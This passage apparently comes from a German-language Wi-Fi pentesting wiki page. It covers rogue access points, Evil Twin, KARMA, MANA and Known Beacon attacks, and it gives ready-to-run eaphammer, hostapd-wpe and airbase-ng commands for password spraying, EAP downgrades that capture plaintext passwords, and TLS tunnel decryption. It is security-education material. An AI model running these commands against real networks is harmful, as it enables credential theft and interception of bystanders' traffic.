./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Sie könnten diesen Angriff auch mit `eaphammer` durchführen:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client attacks — Theorie

### Netzwerkauswahl und Roaming

- Das 802.11-Protokoll definiert, wie eine Station einem Extended Service Set (ESS) beitritt, spezifiziert aber nicht die Kriterien zur Auswahl eines ESS oder eines Access Points (AP) innerhalb desselben.
- Stationen können zwischen APs mit derselben ESSID roamen und so die Konnektivität über ein Gebäude oder Gebiet hinweg beibehalten.
- Das Protokoll verlangt die Authentifizierung der Station gegenüber dem ESS, schreibt jedoch nicht vor, dass sich der AP gegenüber der Station authentifizieren muss.

### Preferred Network Lists (PNLs)

- Stationen speichern die ESSID jedes drahtlosen Netzwerks, mit dem sie sich verbinden, in ihrer Preferred Network List (PNL), zusammen mit netzwerkspezifischen Konfigurationsdetails.
- Die PNL wird verwendet, um automatisch eine Verbindung zu bekannten Netzwerken herzustellen und so die Benutzererfahrung durch Vereinfachung des Verbindungsprozesses zu verbessern.

### Passive Scanning

- APs senden periodisch Beacon-Frames aus, die ihre Präsenz und Funktionen ankündigen, einschließlich der ESSID des AP, sofern das Broadcasting nicht deaktiviert ist.
- Beim passiven Scannen lauschen Stationen auf Beacon-Frames. Wenn die ESSID eines Beacons mit einem Eintrag in der PNL der Station übereinstimmt, kann die Station sich automatisch mit diesem AP verbinden.
- Kenntnis der PNL eines Geräts ermöglicht potenzielle Ausnutzung, indem man die ESSID eines bekannten Netzwerks nachahmt und das Gerät dazu bringt, sich mit einem Rogue AP zu verbinden.

### Active Probing

- Beim Active Probing senden Stationen Probe Requests, um nahegelegene APs und deren Eigenschaften zu entdecken.
- Directed Probe Requests richten sich an eine bestimmte ESSID und helfen zu erkennen, ob ein bestimmtes Netzwerk in Reichweite ist, selbst wenn es hidden ist.
- Broadcast Probe Requests haben ein null SSID-Feld und werden an alle nahegelegenen APs gesendet, sodass die Station prüfen kann, ob eines ihrer bevorzugten Netzwerke vorhanden ist, ohne den Inhalt ihrer PNL preiszugeben.

## Simple AP with redirection to Internet

Bevor erklärt wird, wie man komplexere Angriffe durchführt, wird zunächst erläutert, **wie** man einfach einen **AP** **erstellt** und dessen **Traffic** **auf** ein mit dem **Internet** verbundenes Interface **umleitet**.

Verwenden Sie `ifconfig -a`, um zu prüfen, dass das wlan-Interface, das zum Erstellen des AP verwendet werden soll, und das mit dem Internet verbundene Interface vorhanden sind.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Erstelle die Konfigurationsdatei `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Dann **set IPs** und **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Und dann **starte** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Erstelle eine Konfigurationsdatei `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Beende störende Prozesse**, setze **monitor mode**, und **starte hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Weiterleitung und Umleitung
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Ein Evil Twin-Angriff nutzt aus, wie WiFi-Clients Netzwerke erkennen: Hauptsächlich wird auf den Netzwerknamen (ESSID) vertraut, ohne dass die base station (access point) sich gegenüber dem Client authentifizieren muss. Wichtige Punkte sind:

- **Difficulty in Differentiation**: Geräte haben Schwierigkeiten, legitime und rogue access points zu unterscheiden, wenn sie dieselbe ESSID und denselben encryption type verwenden. Reale Netzwerke nutzen oft mehrere access points mit derselben ESSID, um die Abdeckung nahtlos zu erweitern.
- **Client Roaming and Connection Manipulation**: Das 802.11-Protokoll erlaubt Geräten, innerhalb desselben ESS zwischen access points zu wechseln. Angreifer können dies ausnutzen, indem sie ein Gerät dazu verleiten, sich von seiner aktuellen base station zu trennen und sich mit einem rogue access point zu verbinden. Dies kann erreicht werden, indem ein stärkeres Signal angeboten wird oder die Verbindung zum legitimen access point durch Methoden wie deauthentication packets oder jamming gestört wird.
- **Challenges in Execution**: Einen evil twin attack erfolgreich in Umgebungen mit mehreren, gut platzierten access points durchzuführen, kann schwierig sein. Das Deauthenticating eines einzelnen legitimen access point führt oft dazu, dass sich das Gerät mit einem anderen legitimen access point verbindet, es sei denn, der Angreifer kann alle nahegelegenen access points deauthenticate oder den rogue access point strategisch platzieren.

Du kannst ein sehr einfaches Open Evil Twin erstellen (keine Möglichkeit, Traffic ins Internet zu routen), indem du:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Du kannst auch einen Evil Twin mit **eaphammer** erstellen (beachte, dass zum Erstellen von evil twins mit eaphammer die interface **should NOT be** im **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Oder mit Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Bitte beachten Sie, dass standardmäßig, wenn ein ESSID in der PNL als WPA geschützt gespeichert ist, das Gerät sich nicht automatisch mit einem Open evil Twin verbindet. Sie können versuchen, den realen AP per DoS lahmzulegen und hoffen, dass der Benutzer sich manuell mit Ihrem Open evil Twin verbindet, oder Sie können den realen AP per DoS angreifen und einen WPA Evil Twin einsetzen, um den handshake zu capture (bei dieser Methode können Sie das Opfer nicht zu sich verbinden lassen, da Sie den PSK nicht kennen, aber Sie können den handshake erfassen und versuchen, ihn zu cracken).

_Einige OS und AV werden den Benutzer warnen, dass die Verbindung zu einem Open network gefährlich ist..._

### WPA/WPA2 Evil Twin

Sie können einen **Evil Twin using WPA/2** erstellen und wenn die Geräte so konfiguriert sind, sich mit diesem SSID über WPA/2 zu verbinden, werden sie versuchen, sich zu verbinden. Allerdings benötigen Sie, um den 4-way-handshake abzuschließen, außerdem das **Passwort**, das der Client verwenden wird. Wenn Sie es **nicht wissen**, wird die **Verbindung nicht abgeschlossen**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Um diesen Angriff zu verstehen, empfehle ich, vorher die kurze [WPA Enterprise-Erklärung](#wpa-enterprise-mgt) zu lesen.

**Verwendung von hostapd-wpe**

`hostapd-wpe` benötigt eine **Konfigurationsdatei**, um zu funktionieren. Um die Erstellung dieser Konfigurationen zu **automatisieren**, kannst du [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) verwenden (lade die Python-Datei in _/etc/hostapd-wpe/_ herunter).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
In der Konfigurationsdatei lassen sich viele verschiedene Einstellungen auswählen, z. B. ssid, channel, user files, cret/key, dh parameters, wpa version und auth...

[**Verwendung von hostapd-wpe mit EAP-TLS, um die Anmeldung mit beliebigen Zertifikaten zu ermöglichen.**](evil-twin-eap-tls.md)

**EAPHammer verwenden**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Standardmäßig verwendet EAPHammer diese authentication methods (beachte GTC als erste, um plaintext passwords zu erhalten, und anschließend die Verwendung robusterer auth methods):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Dies ist die Standardmethode, um lange Verbindungszeiten zu vermeiden. Sie können dem Server jedoch auch die Authentifizierungsmethoden von den schwächsten bis zu den stärksten angeben:
```
--negotiate weakest
```
Oder du könntest auch verwenden:

- `--negotiate gtc-downgrade` um eine hocheffiziente GTC-Downgrade-Implementierung (Klartext-Passwörter) zu nutzen
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` um manuell die angebotenen Methoden anzugeben (wenn die gleichen auth methods in derselben Reihenfolge wie die Organisation angeboten werden, wird der Angriff viel schwerer zu erkennen sein).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Using Airgeddon**

`Airgeddon` kann zuvor generierte Zertifikate verwenden, um EAP-Authentifizierung für WPA/WPA2-Enterprise-Netzwerke anzubieten. Das gefälschte Netzwerk wird das Verbindungsprotokoll auf EAP-MD5 downgraden, sodass es möglich ist, **den Benutzer und den MD5 des Passworts zu erfassen**. Später kann der Angreifer versuchen, das Passwort zu cracken.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (noisy)** or **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_Diese Methode wurde bei einer PEAP-Verbindung getestet, aber da ich einen beliebigen TLS-Tunnel dekryp­tiere, sollte sie auch mit EAP-TTLS funktionieren._

Innerhalb der **Konfiguration** von _hostapd-wpe_ die Zeile auskommentieren, die _**dh_file**_ enthält (von `dh_file=/etc/hostapd-wpe/certs/dh` zu `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Dadurch wird `hostapd-wpe` Schlüssel mit RSA austauschen anstelle von DH, sodass du den Verkehr später **mit dem privaten Server-Schlüssel** **dekodieren** kannst.

Starte nun wie gewohnt den **Evil Twin** mit **`hostapd-wpe`** mit dieser modifizierten Konfiguration. Starte außerdem **`wireshark`** in der **Schnittstelle**, die den Evil Twin-Angriff ausführt.

Jetzt oder später (wenn du bereits einige Authentifizierungsversuche aufgezeichnet hast) kannst du den privaten RSA-Schlüssel zu wireshark hinzufügen unter: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Füge einen neuen Eintrag hinzu und fülle das Formular mit diesen Werten aus: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**wähle deine Key-Datei aus**, um Probleme zu vermeiden, wähle eine Key-Datei **ohne Passwortschutz**).

![](<../../images/image (687).png>)

Und schau dir den neuen **"Decrypted TLS"**-Tab an:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Verschiedene Typen von Media Access Control Filter-Listen (MFACLs) und ihre jeweiligen Modi sowie Auswirkungen auf das Verhalten eines rogue Access Point (AP):

1. **MAC-basierte Whitelist**:
- Der rogue AP antwortet nur auf Probe-Requests von Geräten, die in der Whitelist angegeben sind, und bleibt für alle anderen, die nicht aufgeführt sind, unsichtbar.
2. **MAC-basierte Blacklist**:
- Der rogue AP ignoriert Probe-Requests von Geräten auf der Blacklist und ist somit für diese speziellen Geräte effektiv unsichtbar.
3. **SSID-basierte Whitelist**:
- Der rogue AP antwortet nur auf Probe-Requests für bestimmte, aufgeführte ESSIDs und ist damit unsichtbar für Geräte, deren Preferred Network Lists (PNLs) diese ESSIDs nicht enthalten.
4. **SSID-basierte Blacklist**:
- Der rogue AP antwortet nicht auf Probe-Requests für die spezifischen ESSIDs auf der Blacklist und ist damit unsichtbar für Geräte, die nach genau diesen Netzwerken suchen.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Diese Methode erlaubt es einem attacker, einen schädlichen access point (AP) zu erstellen, der auf alle probe requests von devices antwortet, die versuchen, sich mit Netzwerken zu verbinden. Diese Technik täuscht devices, sodass sie sich mit dem AP des attackers verbinden, indem sie die Netzwerke imitiert, nach denen die devices suchen. Sobald ein Gerät eine Verbindungsanfrage an diesen rogue AP sendet, wird die Verbindung abgeschlossen, wodurch das Gerät irrtümlich mit dem Netzwerk des attackers verbunden wird.

### MANA

Daraufhin begannen devices, unsichere Netzwerkantworten zu ignorieren, was die Wirksamkeit des ursprünglichen KARMA-Angriffs reduzierte. Allerdings wurde eine neue Methode, bekannt als der MANA-Angriff, von Ian de Villiers und Dominic White eingeführt. Diese Methode beinhaltet, dass der rogue AP die Preferred Network Lists (PNL) von devices erfasst, indem er auf deren broadcast probe requests mit Netzwerknamen (SSIDs) antwortet, die zuvor von den devices verwendet wurden. Dieser ausgeklügelte Angriff umgeht die Schutzmechanismen gegen den ursprünglichen KARMA-Angriff, indem er ausnutzt, wie devices bekannte Netzwerke speichern und priorisieren.

Der MANA-Angriff funktioniert, indem er sowohl directed als auch broadcast probe requests von devices überwacht. Bei directed requests erfasst er die MAC address des devices und den angeforderten Netzwerknamen und fügt diese Informationen einer Liste hinzu. Wenn ein broadcast request eintrifft, antwortet der AP mit Informationen, die mit einem der Netzwerke auf der Liste des devices übereinstimmen, und verlockt so das device, sich mit dem rogue AP zu verbinden.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Eine **Loud MANA attack** ist eine fortgeschrittene Strategie für Situationen, in denen Geräte kein directed probing verwenden oder ihre Preferred Network Lists (PNL) dem Angreifer unbekannt sind. Sie beruht auf dem Prinzip, dass **Geräte im gleichen Bereich wahrscheinlich einige Netzwerknamen in ihren PNLs teilen**. Anstatt selektiv zu antworten, sendet dieser Angriff probe responses für jeden Netzwerknamen (ESSID), der in den zusammengefassten PNLs aller beobachteten Geräte gefunden wird. Dieser breit angelegte Ansatz erhöht die Wahrscheinlichkeit, dass ein Gerät ein vertrautes Netzwerk erkennt und versucht, sich mit dem rogue Access Point (AP) zu verbinden.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Wenn die **Loud MANA attack** nicht ausreicht, bietet die **Known Beacon attack** einen anderen Ansatz. Diese Methode **erzwingt den Verbindungsprozess, indem sie einen AP simuliert, der auf beliebige Netzwerknamen antwortet und dabei eine Liste potenzieller ESSIDs** durchsucht, die aus einer wordlist abgeleitet sind. Das simuliert die Existenz zahlreicher Netzwerke in der Hoffnung, mit einer ESSID in der PNL des Opfers übereinzustimmen und dadurch einen Verbindungsversuch zum gefälschten AP auszulösen. Der Angriff kann durch die Kombination mit der Option `--loud` verstärkt werden, um aggressiver Geräte anzulocken.

Eaphammer implementierte diesen Angriff als MANA attack, bei dem alle ESSIDs in einer Liste ausgestrahlt werden (du könntest dies auch mit `--loud` kombinieren, um einen Loud MANA + Known beacons attack zu erzeugen):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

Die **Known Beacon Burst attack** beinhaltet das **schnelle, fortlaufende Senden von beacon frames für jede in einer Datei aufgelistete ESSID**. Das erzeugt eine dichte Umgebung gefälschter Netzwerke und erhöht erheblich die Wahrscheinlichkeit, dass Geräte sich mit dem rogue AP verbinden, insbesondere in Kombination mit einer MANA attack. Diese Technik nutzt Geschwindigkeit und Volumen, um die Netzauswahlmechanismen der Geräte zu überlasten.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** ist ein Protokoll, das Geräten ermöglicht, direkt über Wi‑Fi miteinander zu verbinden, ohne dass ein traditioneller Wireless Access Point erforderlich ist. Diese Fähigkeit ist in verschiedenen Internet of Things (IoT)-Geräten integriert, wie Druckern und Fernsehern, und erleichtert die direkte Kommunikation zwischen Geräten. Ein bemerkenswertes Merkmal von Wi‑Fi Direct ist, dass ein Gerät die Rolle eines Access Points übernimmt, bekannt als group owner, um die Verbindung zu verwalten.

Die Sicherheit von Wi‑Fi Direct-Verbindungen wird durch **Wi‑Fi Protected Setup (WPS)** hergestellt, das mehrere Methoden für das sichere Pairing unterstützt, darunter:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Diese Methoden, insbesondere PIN entry, sind anfällig für dieselben Schwachstellen wie WPS in traditionellen Wi‑Fi-Netzwerken und damit Ziele ähnlicher Angriffsvektoren.

### EvilDirect Hijacking

**EvilDirect Hijacking** ist ein Angriff, der speziell auf Wi‑Fi Direct abzielt. Er spiegelt das Konzept eines Evil Twin-Angriffs wider, richtet sich jedoch gegen Wi‑Fi Direct-Verbindungen. In diesem Szenario gibt sich ein Angreifer als legitimer group owner aus, mit dem Ziel, Geräte dazu zu bringen, sich mit einer bösartigen Entität zu verbinden. Diese Methode kann mit Tools wie `airbase-ng` ausgeführt werden, indem Kanal, ESSID und MAC-Adresse des nachgeahmten Geräts angegeben werden:

## Referenzen

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Schau dir [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) an (Login mit Facebook und Imitation von WPA in captive portals)

{{#include ../../banners/hacktricks-training.md}}
